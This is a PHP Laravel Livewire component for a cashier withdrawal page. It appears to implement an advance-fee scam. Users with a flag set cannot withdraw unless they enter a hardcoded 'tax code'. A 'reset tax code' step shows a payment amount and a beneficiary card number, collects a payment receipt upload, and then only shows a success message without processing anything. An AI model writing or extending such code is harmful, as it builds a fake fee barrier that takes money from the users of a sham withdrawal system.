<?php
namespace App\Livewire;

use App\Models\OrdersWithdrawal;
use App\Models\ResetTaxCode;
use App\Models\ResetTaxCodeSettings;
use App\Traits\LogsActivity;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Str;
use Livewire\Component;
use Livewire\WithFileUploads;

class Cashier extends Component
{
    use WithFileUploads;
    use LogsActivity;

    public $balance;
    public $cashiers;
    public $amount;
    public $card;
    public $taxCode = null;
    public $taxCodeType;
    public $confirmingWithdrawal;
    public $resetTaxCode;
    public $disabledConfirmWithdrawal = false;
    public $correctTaxCode = '9yNGCS4AvW3';
    public $beneficiaryDetails;
    public $paymentAmount;
    public $paymentReceipt;
    public $enableSumbit = false;
    public $resetTaxAmount;
    public $resetTaxCard;

    public function openWithdrawal()
    {
        $this->confirmingWithdrawal = true;
    }

    public function cancelOpenWithdrawal()
    {
        $this->confirmingWithdrawal = false;
    }

    public function openResetTaxCode()
    {
        $this->confirmingWithdrawal = false;
        $this->resetTaxCode = true;
    }

    public function closeResetTaxCode()
    {
        $this->resetTaxCode = false;
    }

    public function updatedAmount()
    {
        if ($this->amount > $this->balance) {
            $this->amount = $this->balance;
        }
    }

    public function updatedTaxCode()
    {
        // Проверка введённого кода
        if ($this->taxCodeType && $this->taxCode !== $this->correctTaxCode) {
            $this->disabledConfirmWithdrawal = true;
        } else {
            $this->disabledConfirmWithdrawal = false;
        }
    }

    public function confirmWithdrawal()
    {
        $this->validate([
            'amount' => 'required|integer|min:10',
            'card' => 'required|integer|digits_between:16,20'
        ]);

        if ($this->taxCodeType && $this->taxCode !== $this->correctTaxCode) {
            session()->flash('error', __('Invalid tax code. Please enter the correct code.'));
            return;
        }

        if ($this->amount > $this->balance) {
            $this->amount = $this->balance;
        }

        $payload = [
            'user_id' => auth()->user()->id,
            'balance' => $this->balance,
            'amount' => $this->amount,
            'disbursement' => $this->card,
            'referral_code' => $this->taxCode
        ];
        OrdersWithdrawal::create($payload);

        $this->logActivity('Withdrawal amount', $payload);

        session()->flash('message', __('Withdrawal request successfully sent'));
        $this->confirmingWithdrawal = false;
    }

    public function confirmPayment()
    {
        $this->validate([
            'paymentReceipt' => 'required|file|mimes:jpg,jpeg,png,pdf|max:2048',
        ]);

        $this->paymentReceipt = null;

        session()->flash('message', __('Payment confirmed and tax code reset process initiated.'));
        $this->resetTaxCode = false;
        $this->enableSumbit = false;
    }

    public function updatedPaymentReceipt()
    {
        $this->validate([
            'paymentReceipt' => 'required|file|mimes:jpg,jpeg,png,pdf|max:2048',
        ]);

        $originalName = Str::random(40) . $this->paymentReceipt->getClientOriginalName();
        $this->paymentReceipt->storeAs('reset-tax-code', $originalName, 'public');

        $payload = [
            'user_id' => Auth::user()->id,
            'receipt_path' => '/storage/reset-tax-code/' . $originalName
        ];
        ResetTaxCode::create($payload);

        $this->logActivity('Reset Tax Code', $payload);

        $this->enableSumbit = true;
    }

    public function mount()
    {
        $this->balance = auth()->user()->balance;
        $this->cashiers = \App\Models\Cashier::all();
        $this->taxCodeType = Auth::user()->getSettingByType(\App\Enum\UserSettings::REF_CODE);
        $this->disabledConfirmWithdrawal = $this->taxCodeType ? true : false;
        $this->resetTaxAmount = ResetTaxCodeSettings::all()->first()->payment_amount ?? '';
        $this->resetTaxCard = ResetTaxCodeSettings::all()->first()->beneficiary_card_number ?? '';
    }

    public function render()
    {
        return view('livewire.cashier');
    }
}
